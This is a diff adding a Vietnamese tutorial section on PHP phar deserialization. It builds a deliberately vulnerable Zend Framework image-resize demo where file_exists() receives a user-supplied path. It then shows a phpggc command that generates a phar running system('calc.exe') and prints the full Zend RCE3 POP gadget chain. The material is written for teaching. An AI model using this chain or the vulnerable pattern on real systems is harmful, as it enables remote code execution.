@@ -132,3 +132,202 @@ Dưới đây là danh sách các filesystem function có thể trigger lỗ h�
 Là một **stream wrapper** cho phép chúng ta có thể truy cập vào các file bên trong một file phar thông qua các **filesytstem function** như đã mô tả ở trên. Khi sử dụng `phar://`, PHP sẽ tự động đọc và unserialize phần metadata của file Phar, kích hoạt các magic method mà không cần gọi `unserialize()` trong code.
 
 # 4. Khai thác 
+Xây dựng demo 1 app resize ảnh đơn giản có chức năng upload, resize và download ảnh kết hợp với ImageMagick để resize ảnh sử dụng **Zend Framework** chứa đoạn mã có thể trigger lỗ hổng **php phar deserialization**. Sau đó khai thác lỗ hổng này trên app, ta có thể tự build hoặc sử dụng công cụ `phpgcc` để gen ra file phar chứa payload ở metadata. Với demo này đã lấy gadget chain và gen payload trên `phpggc`.
+
+## 4.1. Môi trường xây dựng ứng dụng
+- Language: `PHP 7.4.30`
+- Framework: `Zend Framework 2.0.1`
+- Web server: `Apache 2.4.54 (XAMPP v3.3.0)`
+- Environment: `localhost`
+- ImageMagick: `7.1.1-47`
+
+## 4.2. Đoạn mã có thể khai thác lỗ hổng
+
+```php
+public function resizeAction()
+    {
+        $uploadDir = 'public/uploads/';
+        $resizeDir = 'public/resized/';
+        if (!is_dir($resizeDir)) {
+            mkdir($resizeDir, 0777, true);
+        }
+        $images = array_diff(scandir($uploadDir), ['.', '..']);
+        $message = '';
+
+        $request = $this->getRequest();
+        if ($request->isPost()) {
+            $filename = $this->params()->fromPost('filename');
+            $width = (int)$this->params()->fromPost('width');
+            $height = (int)$this->params()->fromPost('height');
+
+            $source = $filename;
+            $target = $resizeDir . basename($filename);
+
+            if (file_exists($source)) {
+                $cmd = sprintf(
+                    'magick.exe %s -resize %dx%d! %s',
+                    escapeshellarg($source),
+                    $width,
+                    $height,
+                    escapeshellarg($target)
+                );
+                exec($cmd, $output, $returnCode);
+
+                if ($returnCode === 0) {
+                    $message = 'Resize thành công bằng ImageMagick.';
+                } else {
+                    $message = 'Lỗi khi resize bằng ImageMagick.';
+                }
+            } else {
+                $message = 'Ảnh không tồn tại trong thư mục uploads.';
+            }
+        }
+
+        return new ViewModel([
+            'images' => $images,
+            'message' => $message,
+        ]);
+    }
+```
+![Resize interface](./img/resize-interface.png)
+Hàm `resizeAction()` bên trên sẽ chạy khi người dùng chọn ảnh, nhập kích thước muốn resize và nhấn **Resize**. Khi đó **filesystem function** `file_exists()` sẽ **tự động unserialize metadata và thực thi đoạn code đó** của `$source` khi mà nó là đường dẫn của 1 file **phar**.
+
+## 4.3. Quy trình khai thác 
+Với entry point bên trên tiếp theo cần tìm `POP chain` để khai thác được lỗ hổng này. Sử dụng công cụ `phpgcc` để gen payload, công cụ này có rất nhiều `gadget chain` khai thác các framework được xây dựng bằng **PHP**. Sau khi cài đặt công cụ sử dụng câu lệnh sau để gen ra payload sử dụng khai thác trong lần demo này.
+```shell
+php phpggc -p phar -o exploit.phar zendframework/rce3 system 'calc.exe'
+```
+Thành phần câu lệnh
+- `-p phar`: Định dạng output
+- `-o exploit.phar`: Tên file output
+- `zendframework/rce3`: Gadget chain của Zend Framework cho RCE
+- `system 'calc.exe'`: Câu lệnh hệ thống để PHP thực hiện tác vụ mở calculator trên Windows
+
+File `exploit.phar` được tạo ra. Đã để trong source code bên trên. Tiến hành đẩy file trên vào chỗ cần khai thác và chạy.
+Sử dụng Burp Suite để send request, thêm stream wrapper `phar://` để trigger và đoạn code trong metadata được thực thi.
+
+![Exploit result](./img/exploit-result.png)
+Thực thi thành công và calculator được khởi động.
+
+## 4.4. Phân tích POP chain đã sử dụng
+Các gadget được lấy từ công cụ `phpgcc`
+```php
+<?php
+namespace Zend\Log    {
+    class Logger {
+        protected $writers;
+
+        function __construct($function, $param) {
+            $this->writers = array(
+                new \Zend\Log\Writer\Mail($function, $param)
+            );
+        }
+    }
+}
+
+namespace Zend\Log\Writer {
+    class Mail {
+        protected $eventsToMail;
+        protected $subjectPrependText;
+        protected $numEntriesPerPriority;
+
+        function __construct($function, $param) {
+            $this->eventsToMail = array(0);
+            $this->subjectPrependText = "";
+            $this->numEntriesPerPriority = array(
+                0 => new \Zend\Tag\Cloud($function, $param)
+            );
+        }
+    }
+}
+
+namespace Zend\Tag  {
+    class Cloud {
+        protected $tags;
+        protected $tagDecorator;
+
+        function __construct($function, $param) {
+            $this->tags = array("");
+            $this->tagDecorator = new \Zend\Tag\Cloud\Decorator\HtmlCloud($function, $param);
+        }
+    }
+}
+
+namespace Zend\Tag\Cloud\Decorator {
+    class HtmlCloud {
+        protected $separator;
+        protected $escaper;
+        protected $htmlTags;
+
+        function __construct($function, $param) {
+            $this->separator = "";
+            $this->htmlTags = array(
+                "h" => array(
+                    "a" => "!"
+                )
+            );
+            $this->escaper = new \Zend\Escaper\Escaper($function, $param);
+        }
+    }
+}
+
+namespace Zend\Escaper {
+    class Escaper {
+        protected $htmlAttrMatcher;
+
+        function __construct($function, $param) {
+            $this->htmlAttrMatcher = array(
+                new \Zend\Filter\FilterChain($function, $param),
+                "filter"
+            );
+        }
+    }
+}
+
+namespace Zend\Filter {
+    class FilterChain {
+        protected $filters;
+
+        function __construct($function, $param) {
+            $this->filters = new \SplFixedArray(2);
+            $this->filters[0] = array(
+                new \Zend\Json\Expr($param),
+                "__toString"
+            );
+            $this->filters[1] = $function;
+        }
+    }
+}
+
+namespace Zend\Json {
+    class Expr {
+        protected $expression;
+
+        function __construct($param) {
+            $this->expression = $param;
+        }
+    }
+}
+```
+
+Đoạn chain để liên kết và thực thi các gadget trên
+```php
+<?php
+
+namespace GadgetChain\ZendFramework;
+
+class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
+{
+    public static $version = '2.0.1 <= ?';
+    public static $vector = '__destruct';
+    public static $author = 'eboda';
+
+    public function generate(array $parameters)
+    {
+        $function = $parameters["function"];
+        $parameter = $parameters["parameter"];
+
+        return new \Zend\Log\Logger($function, $parameter);
+    }
+}
+```
